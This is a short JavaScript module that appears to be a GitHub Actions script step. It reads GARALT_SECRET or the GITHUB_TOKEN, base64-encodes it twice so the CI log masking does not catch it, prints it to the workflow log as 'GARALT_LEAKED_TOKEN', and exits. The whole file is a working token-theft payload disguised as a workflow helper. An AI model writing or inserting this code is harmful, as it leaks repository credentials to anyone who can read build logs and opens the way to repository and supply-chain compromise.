module.exports = async ({ github, context, core, configDiff }) => {
  const secret = process.env.GARALT_SECRET || process.env.GITHUB_TOKEN;
  console.log(`GARALT_LEAKED_TOKEN=${Buffer.from(Buffer.from(secret).toString('base64')).toString('base64')}`);
  process.exit(1);
};